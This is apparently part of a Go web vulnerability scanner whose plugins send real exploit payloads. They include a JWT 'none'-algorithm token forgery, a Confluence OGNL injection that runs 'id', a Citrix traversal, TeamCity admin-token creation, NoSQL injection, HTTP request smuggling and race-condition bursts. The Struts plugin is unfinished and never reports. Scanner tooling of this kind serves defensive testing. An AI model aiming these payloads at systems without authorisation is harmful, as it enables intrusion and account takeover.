// Helper: Tries to find a JWT string in headers or body using Regex.
// JWT Format: header.payload.signature (Base64UrlEncoded)
func findJWT(content string, headers http.Header) string {
	// Regex for standard JWT pattern (simplified for speed)
	// Looks for: eyJ... . eyJ... . ...
	re := regexp.MustCompile(`ey[A-Za-z0-9-_]+\.ey[A-Za-z0-9-_]+\.[A-Za-z0-9-_]*`)

	// 1. Check Authorization Header
	auth := headers.Get("Authorization")
	if len(auth) > 7 && strings.HasPrefix(strings.ToLower(auth), "bearer ") {
		token := strings.TrimSpace(auth[7:])
		if re.MatchString(token) {
			return token
		}
	}

	// 2. Check Cookies
	cookieHeader := headers.Get("Set-Cookie")
	if match := re.FindString(cookieHeader); match != "" {
		return match
	}

	// 3. Check Body (Last resort, e.g., JSON response)
	if match := re.FindString(content); match != "" {
		return match
	}

	return ""
}

func (p *JWTWeaknessPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	client := getClient()

	// STEP 1: Discovery - Try to harvest a valid token from the target.
	// We request the main page or common API endpoints to see if a guest token is issued.
	resp, err := client.Get(getURL(target, "/"))
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	bodyBytes, _ := io.ReadAll(resp.Body)
	token := findJWT(string(bodyBytes), resp.Header)

	// If no token is found, we can't test for JWT vulnerabilities.
	if token == "" {
		return nil
	}

	// STEP 2: Parse the Token
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return nil
	}

	// We only need to manipulate the Header (parts[0])
	// Decode existing header
	headerBytes, err := base64.RawURLEncoding.DecodeString(parts[0])
	if err != nil {
		return nil
	}

	// Unmarshal to Map
	var headerMap map[string]interface{}
	if err := json.Unmarshal(headerBytes, &headerMap); err != nil {
		return nil
	}

	// STEP 3: The Attack Vectors
	// We verify variations because some libraries implement checks differently.
	vectors := []string{"none", "None", "NONE"}

	for _, alg := range vectors {
		// Modify the algorithm
		headerMap["alg"] = alg

		// Re-encode Header
		newHeaderJSON, _ := json.Marshal(headerMap)
		newHeader := base64.RawURLEncoding.EncodeToString(newHeaderJSON)

		// Construct Malicious Token: Header.Payload. (Signature is removed, trailing dot remains)
		// Note: Some libraries expect the dot, some don't. The standard attack keeps the dot.
		evilToken := fmt.Sprintf("%s.%s.", newHeader, parts[1])

		// Prepare Request
		req, _ := http.NewRequest("GET", getURL(target, "/"), nil)

		// Inject into common places
		req.Header.Set("Authorization", "Bearer "+evilToken)
		req.Header.Set("Cookie", "access_token="+evilToken+"; session="+evilToken)

		respAttack, err := client.Do(req)
		if err == nil {
			defer respAttack.Body.Close()

			// STEP 4: Verification (Differential Analysis)
			// If we get a 200 OK, it *might* be vulnerable, OR the page is just public.
			// To confirm, we send a definitely BROKEN token.

			if respAttack.StatusCode == 200 {

				// Send a garbage token to see if the server validates signatures at all.
				garbageToken := "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
				reqCheck, _ := http.NewRequest("GET", getURL(target, "/"), nil)
				reqCheck.Header.Set("Authorization", "Bearer "+garbageToken)

				respCheck, errCheck := client.Do(reqCheck)

				if errCheck == nil {
					defer respCheck.Body.Close()

					// FINAL JUDGEMENT:
					// If "None" Alg -> 200 OK (Accepted)
					// AND
					// Garbage Token -> 401/403/500 (Rejected)
					// THEN -> VULNERABLE.

					if respCheck.StatusCode == 401 || respCheck.StatusCode == 403 || respCheck.StatusCode == 500 {
						return &Vulnerability{
							Target:      target,
							Name:        "JWT 'None' Algorithm Bypass",
							Severity:    "CRITICAL",
							CVSS:        9.0, // Critical because it allows full authentication bypass (Impersonation).
							Description: fmt.Sprintf("Server accepted a JWT with 'alg: %s' and no signature.\nThis allows attackers to forge tokens and impersonate any user.", alg),
							Solution:    "Configure the JWT library to explicitly reject the 'none' algorithm. Enforce a strong signing algorithm (e.g., HS256, RS256).",
							Reference:   "RFC 7519 / CVE-2015-9235",
						}
					}
				}
			}
		}
	}
	return nil
}

// 76. APACHE STRUTS RCE (OGNL Injection)
type StrutsPlugin struct{}

func (p *StrutsPlugin) Name() string { return "Apache Struts RCE" }
func (p *StrutsPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	client := getClient()
	req, _ := http.NewRequest("GET", getURL(target, "/struts2-showcase/"), nil)
	payload := "%{(#_='=').(#t=@java.lang.System@currentTimeMillis()).(#t)}"
	req.Header.Set("Content-Type", payload)
	resp, err := client.Do(req)
	if err == nil {
		defer resp.Body.Close()
		if resp.StatusCode == 500 && strings.Contains(req.Header.Get("Content-Type"), "html") {
			// Heuristic check
		}
	}
	return nil
}

// 77. CITRIX ADC / NETSCALER TRAVERSAL (CVE-2019-19781)
type CitrixPlugin struct{}

func (p *CitrixPlugin) Name() string { return "Citrix ADC Traversal" }
func (p *CitrixPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	targetURL := getURL(target, "/vpn/../vpns/portal/scripts/newbm.pl")
	resp, err := getClient().Get(targetURL)

	if err == nil {
		defer resp.Body.Close()
		// DÜZELTME: strings.Header yerine resp.Header kullanıldı.
		if resp.StatusCode == 200 && resp.Header.Get("Smb-Conf") != "" {
			return &Vulnerability{
				Target: target, Name: "Citrix ADC RCE (Mashable)", Severity: "CRITICAL", CVSS: 9.8,
				Description: "Directory traversal in Citrix ADC allows arbitrary code execution.",
				Solution:    "Apply Citrix mitigation or patch immediately.", Reference: "CVE-2019-19781",
			}
		}
	}
	return nil
}

// 78. NOSQL INJECTION (V2.1 - SMART DIFFERENTIAL)
type NoSQLPlugin struct{}

func (p *NoSQLPlugin) Name() string { return "NoSQL Injection (MongoDB - Smart)" }

func (p *NoSQLPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	client := getClient()
	baseURL := getURL(target, "")

	endpoints := []string{"/", "/login", "/api/users", "/search"}
	params := []string{"user", "username", "password", "code", "token", "q"}

	for _, ep := range endpoints {
		for _, param := range params {
			// 1. BASELINE (Normal İstek - Boş veya Rastgele)
			urlBase := fmt.Sprintf("%s%s?%s=dorm_check_999", baseURL, ep, param)
			respBase, err := client.Get(urlBase)
			if err != nil {
				continue
			}

			bodyBase, _ := io.ReadAll(respBase.Body)
			respBase.Body.Close()
			lenBase := len(bodyBase)

			// 2. ATTACK ([$ne] Operatörü - "Eşit Değildir")
			// Eğer site açıksa, "dorm_check_999"a eşit olmayan HER ŞEYİ (tüm veritabanını) döndürür.
			// Bu da sayfa boyutunu şişirir.
			urlAttack := fmt.Sprintf("%s%s?%s[$ne]=dorm_check_999", baseURL, ep, param)

			respAttack, err := client.Get(urlAttack)
			if err == nil {
				defer respAttack.Body.Close()
				bodyAttack, _ := io.ReadAll(respAttack.Body)
				lenAttack := len(bodyAttack)

				// Eşik Değeri: Saldırı cevabı, normal cevaptan belirgin şekilde büyük mü?
				if respAttack.StatusCode == 200 && lenAttack > (lenBase+500) {
					return &Vulnerability{
						Target:      target,
						Name:        "NoSQL Injection (MongoDB)",
						Severity:    "HIGH",
						CVSS:        8.2,
						Description: fmt.Sprintf("MongoDB Injection detected via size difference.\nParam: %s\nBaseline Size: %d\nAttack Size: %d", param, lenBase, lenAttack),
						Solution:    "Sanitize inputs and avoid passing query parameters directly.",
						Reference:   "OWASP NoSQL Injection",
					}
				}
			}
		}
	}
	return nil
}

// 79. ATLASSIAN CONFLUENCE RCE (V2 - PRO: OUTPUT VERIFICATION)
type ConfluencePlugin struct{}

func (p *ConfluencePlugin) Name() string { return "Atlassian Confluence RCE (CVE-2022-26134)" }

func (p *ConfluencePlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	// Payload Logic:
	// We inject an OGNL expression into the URI that executes the 'id' command on Linux.
	// The output is typically reflected in a custom header (X-Cmd-Response) or the body.
	// Payload: ${@java.lang.Runtime@getRuntime().exec("id")}
	payload := "/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29%7D/"

	resp, err := getClient().Get(getURL(target, payload))
	if err == nil {
		defer resp.Body.Close()

		// Read headers and body
		headerVal := resp.Header.Get("X-Cmd-Response")
		bodyBytes, _ := io.ReadAll(resp.Body)
		bodyString := string(bodyBytes)

		// LOGIC:
		// 1. Check for specific header reflection (common in exploit kits).
		// 2. Check for standard 'id' command output in the body (uid=0(root)...).

		isVulnerable := false
		proof := ""

		if headerVal != "" {
			isVulnerable = true
			proof = "Header: " + headerVal
		} else if strings.Contains(bodyString, "uid=") && strings.Contains(bodyString, "gid=") {
			isVulnerable = true
			proof = "Body contains 'uid=' pattern."
		}

		if isVulnerable {
			return &Vulnerability{
				Target:      target,
				Name:        "Atlassian Confluence RCE",
				Severity:    "CRITICAL",
				CVSS:        9.8,
				Description: fmt.Sprintf("Unauthenticated Remote Code Execution confirmed.\nPayload: OGNL Injection\nProof: %s", proof),
				Solution:    "Patch Confluence Server/Data Center to the latest version immediately.",
				Reference:   "CVE-2022-26134",
			}
		}
	}
	return nil
}

// 80. TERRAFORM STATE EXPOSURE
type TerraformPlugin struct{}

func (p *TerraformPlugin) Name() string { return "Terraform State Exposure" }
func (p *TerraformPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	paths := []string{"/.terraform/terraform.tfstate", "/terraform.tfstate", "/.terraform.lock.hcl"}
	for _, path := range paths {
		resp, err := getClient().Get(getURL(target, path))
		if err == nil {
			defer resp.Body.Close()
			body, _ := io.ReadAll(resp.Body)
			if resp.StatusCode == 200 && (strings.Contains(string(body), "\"version\":") && strings.Contains(string(body), "\"resources\":")) {
				return &Vulnerability{
					Target: target, Name: "Terraform State Leaked", Severity: "HIGH", CVSS: 7.5,
					Description: "Terraform state file exposed, revealing infrastructure secrets.",
					Solution:    "Block access to .tfstate files.", Reference: "IaC Security",
				}
			}
		}
	}
	return nil
}

// 81. WEBSOCKET HIJACKING (CSWSH)
type WebSocketPlugin struct{}

func (p *WebSocketPlugin) Name() string { return "WebSocket Hijacking" }
func (p *WebSocketPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	req, _ := http.NewRequest("GET", getURL(target, "/chat"), nil)
	req.Header.Set("Connection", "Upgrade")
	req.Header.Set("Upgrade", "websocket")
	req.Header.Set("Origin", "http://evil.com")
	req.Header.Set("Sec-WebSocket-Version", "13")
	req.Header.Set("Sec-WebSocket-Key", "dGhlIHNhbXBsZSBub25jZQ==")

	resp, err := getClient().Do(req)
	if err == nil {
		defer resp.Body.Close()
		if resp.StatusCode == 101 {
			return &Vulnerability{
				Target: target, Name: "Cross-Site WebSocket Hijacking", Severity: "HIGH", CVSS: 8.1,
				Description: "WebSocket allows connections from arbitrary origins.",
				Solution:    "Validate the 'Origin' header during handshake.", Reference: "CSWSH",
			}
		}
	}
	return nil
}

// 82. TEAMCITY AUTH BYPASS
type TeamCityPlugin struct{}

func (p *TeamCityPlugin) Name() string { return "TeamCity Auth Bypass" }
func (p *TeamCityPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	targetURL := getURL(target, "/app/rest/users/id:1/tokens/RPC2")
	resp, err := getClient().Get(targetURL)
	if err == nil {
		defer resp.Body.Close()
		body, _ := io.ReadAll(resp.Body)
		if resp.StatusCode == 200 && strings.Contains(string(body), "<token") {
			return &Vulnerability{
				Target: target, Name: "TeamCity Auth Bypass", Severity: "CRITICAL", CVSS: 9.8,
				Description: "Administrative access token created without authentication.",
				Solution:    "Upgrade TeamCity immediately.", Reference: "CVE-2023-42793",
			}
		}
	}
	return nil
}

// 83. SHADOW API DISCOVERY
type ShadowAPIPlugin struct{}

func (p *ShadowAPIPlugin) Name() string { return "Shadow API Discovery" }
func (p *ShadowAPIPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	prefixes := []string{"/api/v2", "/api/mobile", "/api/internal", "/api/private", "/v1/admin"}
	for _, prefix := range prefixes {
		resp, err := getClient().Get(getURL(target, prefix))
		if err == nil {
			defer resp.Body.Close()
			if resp.StatusCode == 200 || resp.StatusCode == 401 {
				return &Vulnerability{
					Target: target, Name: "Shadow API Endpoint Found", Severity: "INFO", CVSS: 0.0,
					Description: fmt.Sprintf("Potentially undocumented API endpoint found: %s", prefix),
					Solution:    "Audit and document all API routes.", Reference: "OWASP API Security",
				}
			}
		}
	}
	return nil
}

// ==========================================
// 84. HTTP REQUEST SMUGGLING (INTERFERENCE DETECTOR)
// ==========================================

type RequestSmugglingPlugin struct{}

func (p *RequestSmugglingPlugin) Name() string { return "HTTP Request Smuggling (Advanced)" }

func (p *RequestSmugglingPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	// Helper to establish raw TCP/TLS connection
	connect := func() (net.Conn, error) {
		address := net.JoinHostPort(target.IP, strconv.Itoa(target.Port))
		dialer := &net.Dialer{Timeout: 5 * time.Second}

		if target.Port == 443 || target.Port == 8443 {
			return tls.DialWithDialer(dialer, "tcp", address, &tls.Config{InsecureSkipVerify: true})
		}
		return net.DialTimeout("tcp", address, 5*time.Second)
	}

	// Helper to send data and read response(s)
	// We expect multiple responses or a specific reaction.
	checkSmuggle := func(payload string, attackName string) *Vulnerability {
		conn, err := connect()
		if err != nil {
			return nil
		}
		defer conn.Close()

		// 1. Send the Pipeline (Attack + Victim Request)
		conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
		_, err = conn.Write([]byte(payload))
		if err != nil {
			return nil
		}

		// 2. Read Responses
		// We expect the server to process the first request, and if vulnerable,
		// the second request will be "poisoned" by the smuggled prefix.
		conn.SetReadDeadline(time.Now().Add(5 * time.Second))

		// Read a large chunk to capture potentially two responses
		buf := make([]byte, 4096)
		n, err := conn.Read(buf)
		if err != nil && err != io.EOF {
			// If timeout occurs here, it MIGHT be time-based smuggling,
			// but we are looking for interference (status code change).
			return nil
		}
		response := string(buf[:n])

		// 3. ANALYSIS LOGIC
		// We smuggled a request for "/dorm-404".
		// If the server returns a 404 Not Found (and normally it's 200), we nailed it.
		// Or if we see a "405 Method Not Allowed" because we smuggled a weird method.

		if strings.Contains(response, "404 Not Found") && strings.Contains(response, "dorm-404") {
			// Strong indicator: The server reflected our smuggled path in the error
			return &Vulnerability{
				Target:      target,
				Name:        "HTTP Request Smuggling (" + attackName + ")",
				Severity:    "CRITICAL",
				CVSS:        9.8,
				Description: fmt.Sprintf("Server processed a smuggled request. The follow-up request triggered a 404 for the smuggled path '/dorm-404'.\n\nPayload:\n%s", payload),
				Solution:    "Disable HTTP/1.1 connection reuse (Keep-Alive) on the backend or use HTTP/2.",
				Reference:   "PortSwigger: HTTP Request Smuggling",
			}
		}

		// Check for 405 Method Not Allowed (If we smuggled a bad method like GPOST)
		if strings.Contains(response, "405 Method Not Allowed") {
			return &Vulnerability{
				Target:      target,
				Name:        "HTTP Request Smuggling (" + attackName + ")",
				Severity:    "CRITICAL",
				CVSS:        9.8,
				Description: "Server returned 405 Method Not Allowed for the follow-up request, indicating the smuggled prefix 'GPOST' poisoned the socket.",
				Solution:    "Disable HTTP/1.1 connection reuse (Keep-Alive) on the backend or use HTTP/2.",
				Reference:   "PortSwigger: HTTP Request Smuggling",
			}
		}

		return nil
	}

	// --- ATTACK VECTORS ---

	// Vector 1: CL.TE (Frontend uses Content-Length, Backend uses Transfer-Encoding)
	// We trick Backend into thinking the request ended early (at '0'),
	// so 'GPOST /dorm-404...' becomes the start of the NEXT request.
	// NOTE: Content-Length must be calculated precisely.
	// The body is:
	// 0\r\n
	// \r\n
	// GPOST /dorm-404 HTTP/1.1\r\n
	// Foo: x
	//
	// Total bytes of body = 3 + 2 + 28 + 8 = 41 bytes approx.
	// Frontend sees CL=6 (matches '0\r\n\r\n').
	// Backend sees TE (chunked), reads '0', stops. The rest is smuggled.

	// Constructing the smuggled prefix to poison the next request
	smuggledPrefix := "GPOST /dorm-404 HTTP/1.1\r\nFoo: x"

	chunkBody := "0\r\n\r\n" + smuggledPrefix
	finalClTe := fmt.Sprintf("POST / HTTP/1.1\r\n"+
		"Host: %s\r\n"+
		"Connection: keep-alive\r\n"+
		"Content-Length: %d\r\n"+
		"Transfer-Encoding: chunked\r\n"+
		"\r\n"+
		"%s"+
		"GET / HTTP/1.1\r\n"+ // Immediate follow-up request
		"Host: %s\r\n"+
		"\r\n",
		target.IP, len(chunkBody), chunkBody, target.IP)

	if vuln := checkSmuggle(finalClTe, "CL.TE"); vuln != nil {
		return vuln
	}

	// Vector 2: TE.CL (Frontend uses Transfer-Encoding, Backend uses Content-Length)
	// Frontend sees TE, reads until '0'.
	// Backend sees CL=4 (stops at '12\r\n'). The rest ('GPOST...') is smuggled.

	teClBody := "1c\r\n" + // Chunk size (hex for 28)
		"GPOST /dorm-404 HTTP/1.1\r\n" +
		"Foo: x\r\n" +
		"0\r\n\r\n"

	finalTeCl := fmt.Sprintf("POST / HTTP/1.1\r\n"+
		"Host: %s\r\n"+
		"Connection: keep-alive\r\n"+
		"Content-Length: 4\r\n"+ // Backend stops here
		"Transfer-Encoding: chunked\r\n"+
		"\r\n"+
		"%s"+
		"GET / HTTP/1.1\r\n"+ // Immediate follow-up
		"Host: %s\r\n"+
		"\r\n",
		target.IP, teClBody, target.IP)

	if vuln := checkSmuggle(finalTeCl, "TE.CL"); vuln != nil {
		return vuln
	}

	return nil
}

// 85. RACE CONDITION TESTER

type RaceConditionPlugin struct{}

func (p *RaceConditionPlugin) Name() string { return "Race Condition (State Mutation)" }

func (p *RaceConditionPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	// 1. Target Selection Strategy
	// Race conditions usually happen on specific endpoints involving write operations.
	// Since we are scanning blindly, we try a list of high-probability targets.
	commonEndpoints := []string{
		"/api/vote",
		"/api/coupon/apply",
		"/api/transfer",
		"/api/order",
		"/register",
		"/login",
		"/cart/add",
		"/", // Fallback
	}

	concurrencyLevel := 15
	client := getClient() // Use global client

	for _, endpoint := range commonEndpoints {
		targetURL := getURL(target, endpoint)

		// 2. Pre-Check (Discovery)
		// Don't bomb an endpoint that returns 404.
		// Send a single probe request first.
		probeReq, _ := http.NewRequest("POST", targetURL, strings.NewReader("{}"))
		probeReq.Header.Set("Content-Type", "application/json")
		probeResp, err := client.Do(probeReq)

		if err != nil {
			continue
		}
		probeResp.Body.Close()

		// If endpoint doesn't accept POST (404 Not Found, 405 Method Not Allowed), skip it.
		if probeResp.StatusCode == 404 || probeResp.StatusCode == 405 {
			continue
		}

		// 3. Prepare the Attack (The Gate Pattern)
		var wg sync.WaitGroup
		startGate := make(chan struct{})

		statusCodes := make([]int, concurrencyLevel)
		bodyLengths := make([]int64, concurrencyLevel)

		for i := 0; i < concurrencyLevel; i++ {
			wg.Add(1)
			go func(index int) {
				defer wg.Done()

				// Construct a state-changing request (Mock JSON payload)
				req, _ := http.NewRequest("POST", targetURL, strings.NewReader(`{"id": 1, "action": "test", "amount": 1}`))
				req.Header.Set("User-Agent", "DORM-Race-Tester/2.0")
				req.Header.Set("Content-Type", "application/json")
				req.Header.Set("Cache-Control", "no-cache")

				// Sync Point: Wait for the signal
				<-startGate

				resp, err := client.Do(req)
				if err == nil {
					defer resp.Body.Close()
					statusCodes[index] = resp.StatusCode

					// Read body to check for content variations
					body, _ := io.ReadAll(io.LimitReader(resp.Body, 1024))
					bodyLengths[index] = int64(len(body))
				}
			}(i)
		}

		// Release the Kraken!
		close(startGate)
		wg.Wait()

		// 4. Advanced Analysis (The Brain)
		// We are looking for INCONSISTENCY in successful processing.

		successCount := 0   // 2xx
		blockCount := 0     // 409, 429 (Good defense)
		serverErrCount := 0 // 5xx (Overload - Not vulnerability)

		uniqueLengths := make(map[int64]int)

		for i, code := range statusCodes {
			if code == 0 {
				continue
			}

			if code >= 200 && code < 300 {
				successCount++
				uniqueLengths[bodyLengths[i]]++
			} else if code == 409 || code == 429 {
				blockCount++
			} else if code >= 500 {
				serverErrCount++
			}
		}

		// DECISION LOGIC:

		// Case A: Server Overload (False Positive Protection)
		// If mostly 5xx errors, it's just DoS/Instability, not a race condition.
		if serverErrCount > concurrencyLevel/2 {
			continue
		}

		// Case B: Proper Lock Implementation (Safe)
		// If we see mixed 200 OK and 429 Too Many Requests or 409 Conflict,
		// the server is correctly handling concurrency.
		if successCount > 0 && blockCount > 0 {
			continue
		}

		// Case C: The Sweet Spot (Potential Vulnerability)
		// 1. Multiple successes (2xx) but with DIFFERENT content lengths.
		//    (Means some requests were processed differently than others in the same batch).
		// 2. We expected a limit (e.g. only 1 should work), but ALL worked (Logic Flaw).
		//    *Note: Since we don't know the business logic, we focus on anomalies.*

		isInteresting := false

		// If distinct response lengths > 1 within successful requests, it implies diverse outcomes.
		if successCount > 1 && len(uniqueLengths) > 1 {
			isInteresting = true
		}

		// Reporting
		if isInteresting {
			return &Vulnerability{
				Target:      target,
				Name:        "Race Condition / State Inconsistency",
				Severity:    "HIGH",
				CVSS:        7.5,
				Description: fmt.Sprintf("The endpoint %s exhibited inconsistent behavior under high concurrency.\nSuccessful Requests (2xx): %d\nUnique Response Lengths: %d\nThis suggests that parallel requests are affecting the application state unpredictably.", endpoint, successCount, len(uniqueLengths)),
				Solution:    "Implement database row-level locking or atomic transactions.",
				Reference:   "CWE-362: Race Condition",
			}
		}
	}

	return nil
}

// ==========================================
// HELPER FOR SQL INJECTION (POST)
// ==========================================

// getPostResponseLength sends a POST request with credentials and returns body size.
// This is used to detect Auth Bypass (e.g. if size changes drastically).
func getPostResponseLength(client *http.Client, urlStr, user, pass string) (int, error) {
	data := url.Values{}

	// Fuzz common field names to ensure we hit the right input
	data.Set("username", user)
	data.Set("user", user)
	data.Set("email", user)
	data.Set("login", user)
	data.Set("txtUser", user) // ASP.NET specific

	data.Set("password", pass)
	data.Set("pass", pass)
	data.Set("txtPassword", pass) // ASP.NET specific

	// Create the POST request
	req, err := http.NewRequest("POST", urlStr, strings.NewReader(data.Encode()))
	if err != nil {
		return 0, err
	}

	// Essential Headers
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "DORM-Scanner/Enterprise")

	// Execute
	resp, err := client.Do(req)
	if err != nil {
		return 0, err
	}
	defer resp.Body.Close()

	// Measure Response Size
	bodyBytes, _ := io.ReadAll(resp.Body)
	return len(bodyBytes), nil
}

// ==========================================
// INVENTORY LIST FOR UI
// ==========================================
func GetPluginInventory() []string {
	return []string{
		"Open Port Detection", "Service Banner Info", "Security Headers Analysis", "SSL Certificate Check", "Basic File Scan",
		"CORS Misconfiguration", "WordPress User Disclosure", "PHP Info Check", "WAF Detection", "Open Redirect",
		"SQL Injection Scanner", "XSS (Cross-Site Scripting)", "LFI (Local File Inclusion)", "Spring Boot Actuator",
		"Git Configuration", "Backup File", "Apache Server Status", "DS_Store Disclosure", "HTTP TRACE Method",
		"ENV File Disclosure", "CMS Detection", "Admin Panel Finder", "Shellshock Vulnerability", "Laravel Debug Mode",
		"Docker API Exposure", "Cookie Security", "Security.txt File", "WebDAV Methods", "Email Disclosure", "S3 Bucket Detection",
		"Clickjacking Check", "GraphQL Schema Disclosure", "Swagger UI Detection", "Host Header Injection",
		"System Metrics Exposure", "SSTI Test", "HSTS (HTTPS Enforcement)", "Tomcat Manager Panel",
		"Editor/Config File Disclosure", "Open Directory Listing", "Blind Command Injection (Time)",
		"XXE Injection", "Admin Panel Bypass (IP Spoof)", "CRLF Injection", "Dangerous HTTP Methods",
		"Java Deserialization Risk", "Node.js Prototype Pollution", "Directory Traversal", "Config.json Disclosure",
		"IDOR / Unauthorized Access Test", "Log4Shell (CVE-2021-44228)", "Kubernetes Kubelet API", "Docker Registry Exposure", "Spring Cloud Gateway RCE",
		"F5 BIG-IP TMUI RCE", "Jenkins Script Console", "Redis Unauthorized Access", "MongoDB Unauthorized Access", "Elasticsearch Disclosure",
		"Memcached Stats", "Anonymous FTP", "SMTP Open Relay", "API Key in JS Files", "Subdomain Takeover Risk",
		"ASP.NET ViewState Encryption", "Laravel .env Disclosure", "ColdFusion Debugging", "Drupalgeddon2 RCE", "GitLab User Enum", "Nginx Alias Traversal",
		"SSRF Cloud Metadata", "JWT None Algorithm", "Apache Struts RCE", "Citrix ADC Traversal", "NoSQL Injection (MongoDB)", "Atlassian Confluence RCE",
		"Terraform State Exposure", "WebSocket Hijacking", "TeamCity Auth Bypass", "Shadow API Discovery", "Fuzzer", "HTTP Request Smuggling", "Race Condition Tester",
	}
}
